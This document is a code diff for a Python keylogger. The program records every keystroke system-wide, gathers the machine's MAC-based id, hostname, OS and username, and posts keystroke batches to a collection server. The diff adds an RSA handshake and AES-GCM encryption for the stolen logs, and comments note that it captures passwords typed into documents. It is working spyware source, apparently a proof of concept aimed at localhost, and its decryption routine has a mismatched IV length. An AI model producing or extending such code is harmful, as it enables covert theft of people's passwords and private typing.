@@ -7,17 +7,106 @@ import json
 import uuid
 import platform
 import os
+import base64
+
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives import hmac
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 # config
 COUNTDOWN_DURATION = 10 # relatively arbitrary duration but represents the time before key collection stops for that batch of inputs
 # LOG_FILE_PATH = "keylogs.txt" # temp local file
-SERVER_URL = "http://localhost:8080/log"
+SERVER_BASE_URL = "http://localhost:8080"
+SERVER_URL = f"{SERVER_BASE_URL}/log"
+HANDSHAKE_ENDPOINT = f"{SERVER_BASE_URL}/handshake"
 
 # globals
 collected_keys = [] # list to store the accumulated key logs
 countdown_active = False # flag to indicate if the countdown thread is running
 initial_log_time = None # current batch start timestamp
 last_keypress_time = None # last input timestamp (initialized to None, will be set on first keypress)
+SYMMETRIC_KEY = None
+PUBLIC_KEY_PEM = None
+
+def generate_aes_key():
+    """Generates a new random AES (symmetric) key."""
+    return os.urandom(32)  # 256 bit key
+
+def encrypt_aes_gcm(key, plaintext):
+    """Encrypts data using AES-256 in GCM mode."""
+    iv = os.urandom(12)  # GCM standard IV size
+    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
+    tag = encryptor.tag
+    return iv + ciphertext + tag # concat iv, ciphertext, and auth tag for transmission
+
+def decrypt_aes_gcm(key, encrypted_data):
+    """Decrypts data using AES-256 in GCM mode."""
+    iv_len = 16 # AES GCM is 16 bytes
+    tag_len = 16 # GCM tag is also 16 bytes
+
+    iv = encrypted_data[:iv_len] # extract the IV
+    ciphertext = encrypted_data[iv_len:-tag_len] # extract the ciphertext
+    tag = encrypted_data[-tag_len:] # extract the tag
+
+    # create the cipher object and decrypt
+    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
+    decryptor = cipher.decryptor()
+    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+    return plaintext.decode()
+
+def perform_handshake():
+    """
+    Retrieves the RSA public key from the server and generates a symmetric AES key.
+    The AES key is then encrypted with the RSA public key for secure transmission.
+    Returns the encrypted AES key.
+    """
+
+    global SYMMETRIC_KEY, PUBLIC_KEY_PEM
+
+    print("Performing handshake to retrieve RSA public key and generate AES key...")
+    try:
+        response = requests.get(HANDSHAKE_ENDPOINT)
+        response.raise_for_status()
+        public_key_data = response.json()
+        PUBLIC_KEY_PEM = public_key_data.get("public_key_pem")
+
+        if not PUBLIC_KEY_PEM:
+            raise ValueError("Public key PEM not found in response.")
+        
+        server_public_key = serialization.load_pem_public_key(
+            PUBLIC_KEY_PEM.encode('utf-8'),
+            backend=default_backend()
+        )
+        print("Public key retrieved successfully.")
+
+        SYMMETRIC_KEY = generate_aes_key()
+        print("Generated new AES symmetric key.")
+
+        encrypted_symmetric_key = server_public_key.encrypt(
+            SYMMETRIC_KEY,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+
+        # the encrypted AES key will be sent along with the first encrypted log data
+        return True
+    except requests.exceptions.RequestException as e:
+        print(f"Error: Handshake failed (network error): {e}")
+    except ValueError as e:
+        print(f"Error: Handshake failed (data error): {e}")
+    except Exception as e:
+        print(f"Error: An unexpected error occurred during handshake: {e}")
+
+    return False
 
 
 # record each key press and determine the time
@@ -36,12 +125,15 @@ def on_press(key):
     except AttributeError:
         # handle special keys i.e. Space, Enter, Shift, Ctrl, Alt
         if key == keyboard.Key.space:
-            special_key_repr = "[SPACE]"
+            special_key_repr = " "
         elif key == keyboard.Key.enter:
-            special_key_repr = "[ENTER]\n" # add newline for readability
+            special_key_repr = "\n" # add newline for readability
         elif key == keyboard.Key.tab:
-            special_key_repr = "[TAB]\t"
+            special_key_repr = "\t"
         elif key == keyboard.Key.backspace:
+            # backspace is added rather than removing the previous characters to maintain the log integrity
+            # if a user were to enter a password for something like google docs and then backspace within the doc, it would delete the password
+            # i think tracking backspaces separately would be the most effective logging method
             special_key_repr = "[BACKSPACE]"
         else:
             # for other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
@@ -75,7 +167,7 @@ def start_countdown():
         send_data_batch()
 
 def send_data_batch():
-    global collected_keys, initial_log_time
+    global collected_keys, initial_log_time, SYMMETRIC_KEY, PUBLIC_KEY_PEM
 
     if not collected_keys:
         print("No data to send in this batch.")
@@ -85,30 +177,49 @@ def send_data_batch():
     log_duration_seconds = (current_log_time - initial_log_time).total_seconds() if initial_log_time else 0
     log_content = "".join(collected_keys)
 
-    # grab some system info, mostly just PoC
     system_info = {
-        "system_id": str(uuid.getnode()), # simple unique id using the mac address
+        "system_id": str(uuid.getnode()),
         "hostname": platform.node(),
         "os": platform.system(),
         "os_release": platform.release(),
         "username": os.getlogin(),
     }
 
+    # Encrypt log content with AES-GCM
+    encrypted_log_content = encrypt_aes_gcm(SYMMETRIC_KEY, log_content)
+    encrypted_log_content_b64 = base64.b64encode(encrypted_log_content).decode()
+
+    # Encrypt AES key with RSA (already done in handshake, reuse or re-encrypt if needed)
+    server_public_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode('utf-8'), backend=default_backend())
+    encrypted_aes_key = server_public_key.encrypt(
+        SYMMETRIC_KEY,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode()
+
     data = {
         "system_info": system_info,
         "log_start_time_utc": initial_log_time.isoformat() + "Z" if initial_log_time else None,
         "log_duration_seconds": log_duration_seconds,
-        "log_content": log_content
+        "encrypted_aes_key": encrypted_aes_key_b64,
+        "encrypted_log_content": encrypted_log_content_b64
     }
 
     try:
+        print("Encryped AES key length (bytes):", len(encrypted_aes_key))
+        print("Encrypted AES key (base64) length:", encrypted_aes_key_b64)
+        print("AES key (hex):", SYMMETRIC_KEY.hex())
+        print("Encrypted log content length (bytes):", len(encrypted_log_content))
         response = requests.post(SERVER_URL, json=data)
         response.raise_for_status()
         print(f"Data sent successfully. Server response: {response.status_code}")
     except requests.exceptions.RequestException as e:
         print(f"Error sending data: {e}")
     finally:
-        # reset state for the next batch
         collected_keys.clear()
         initial_log_time = None
 
@@ -119,6 +230,10 @@ if __name__ == "__main__":
     print(f"Monitoring system-wide key inputs. Data will dump after {COUNTDOWN_DURATION}s of inactivity.")
     print("Press Ctrl+C to stop.")
     print("-------------------------")
+
+    if not perform_handshake():
+        print("Handshake failed. Exiting.")
+        exit(1)
 
     listener = keyboard.Listener(on_press=on_press)
     # The countdown thread is now explicitly started inside on_press,
